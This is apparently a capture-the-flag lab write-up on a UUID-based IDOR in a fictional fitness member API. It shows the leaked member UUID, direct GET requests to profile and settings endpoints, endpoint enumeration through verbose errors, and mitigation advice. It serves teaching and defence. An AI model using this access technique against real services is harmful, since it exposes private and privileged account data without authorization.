---
title: "UUID-Based IDOR Through Member API | Apex Fitness"
date: 2026-05-9 03:20:00 +0530
categories: [Web Security, IDOR]
tags: [idor, uuid, api, authorization, information-disclosure, webversepro]
platform: WebVerse Labs
author: Shivansh Sharma
image:
  path: /assets/images/posts/apex-uuid-idor-webverse.webp
  alt: UUID-Based IDOR in Apex Fitness Member Portal
---

# UUID-Based IDOR Through Member API | Apex Fitness

## Overview

Apex Fitness migrated its member portal from sequential numeric IDs to UUID-based identifiers believing this would eliminate IDOR vulnerabilities.

Instead of predictable endpoints like:

```python
/user/1
/user/2
/user/3
```

the application used UUIDs:

```python
/user/550e8400-e29b-41d4-a716-446655440000
```

While UUIDs reduce identifier predictability, they do not enforce authorization. If a valid UUID becomes exposed and backend authorization checks are missing, the application remains vulnerable to IDOR.

This lab demonstrates how exposed UUIDs combined with insecure API design allowed unauthorized access to privileged member resources.

---

## Objective

The objective was to determine whether Apex Fitness relied on UUID secrecy instead of proper authorization controls.

The attack path focused on:

- discovering exposed member UUIDs
- accessing backend member APIs directly
- identifying undocumented endpoints
- accessing sensitive privileged resources

---

## Reconnaissance

While viewing a public trainer profile, the following page was identified:

```python
https://0dcf0608-4065-apex-58774.events.webverselabs-pro.com/trainer.php?slug=devon-rourke
```

Reviewing the page source revealed internal structured metadata containing a member UUID:

```json
"identifier": {
    "@type": "PropertyValue",
    "name": "memberId",
    "value": "9b6f1a4e-2c3d-4e5f-8a7b-1c2d3e4f5a6b"
}
```

This exposed an internal backend identifier directly to untrusted users.

---

## Accessing Internal Member APIs

Using the leaked UUID, a request was sent to the backend profile API:

```http
GET /api/members/9b6f1a4e-2c3d-4e5f-8a7b-1c2d3e4f5a6b/profile
```

The response exposed internal member information:

```json
{
    "uuid": "9b6f1a4e-2c3d-4e5f-8a7b-1c2d3e4f5a6b",
    "display_name": "Devon Rourke",
    "role": "trainer_admin"
}
```

Although the profile page was intended to expose public trainer details, the backend API also disclosed internal account metadata and privileged role information.

The exposed `trainer_admin` role confirmed the account possessed elevated privileges.

---

## Endpoint Enumeration

Testing additional API paths revealed informative error handling behavior.

A request to a guessed endpoint returned the following response:

```http
GET /api/members/9b6f1a4e-2c3d-4e5f-8a7b-1c2d3e4f5a6b/sessions
```

```json
{
    "error": "unknown_endpoint",
    "message": "endpoint must be one of: profile, availability, settings",
    "allowed": [
        "profile",
        "availability",
        "settings"
    ]
}
```

The API unintentionally disclosed valid internal endpoints through verbose error messages.

This allowed backend route enumeration without authentication.

---

## Accessing Sensitive Settings

Using the disclosed endpoint list, the `settings` endpoint was accessed:

```http
GET /api/members/9b6f1a4e-2c3d-4e5f-8a7b-1c2d3e4f5a6b/settings
```

The response exposed sensitive internal data, including administrative notes and a privileged access code:

```json
{
    "membership_tier": "Staff",
    "two_factor_enabled": true,
    "internal_notes": "Owner-tier admin. Override toggle in /admin SPA.",
    "admin_access_code": "WEBVERSE{.....}"
}
```

This confirmed that privileged backend resources could be accessed directly without proper authorization validation.

---

## Proof of Exploitation

### Attack Flow

```text
Public trainer page
        ↓
Exposed member UUID
        ↓
Direct member API access
        ↓
Privileged role disclosure
        ↓
Endpoint enumeration
        ↓
Unauthorized access to settings
        ↓
Sensitive administrative data exposure
```

---

## Root Cause

The application trusted UUID secrecy instead of implementing proper server-side authorization.

The developers assumed:

```text
unguessable identifier = secure access control
```

However, UUIDs only make enumeration harder.

They do not determine whether a user should be allowed to access a resource.

Once a valid UUID is exposed through frontend code, APIs, or metadata, every missing authorization check becomes exploitable.

---

## Impact

An attacker could potentially:

- access internal member records
- identify privileged accounts
- enumerate backend API functionality
- leak sensitive administrative information
- obtain privileged access data
- map internal application architecture

In real-world applications, this type of vulnerability frequently leads to privilege escalation or administrative compromise.

---

## Mitigation

### Enforce Authorization Checks

Every request accessing user-controlled objects should validate whether the requester is authorized to access that resource.

---

### Avoid Exposing Internal Identifiers

Sensitive backend identifiers should not be unnecessarily exposed in frontend pages, metadata, or API responses.

---

### Reduce Verbose Error Messages

Error responses should avoid leaking:

- valid endpoints
- backend routes
- internal object structures
- administrative functionality

---

### Apply Proper RBAC Controls

Administrative or privileged resources should always enforce strict role-based access control validation.

---

## Real-World Insight

UUIDs are commonly misunderstood as a security mechanism against IDOR vulnerabilities.

In reality, UUIDs only solve predictable enumeration.

They do not solve broken authorization.

This lab demonstrates a common modern API security issue where identifiers become harder to guess, but sensitive backend resources remain directly accessible due to missing authorization checks.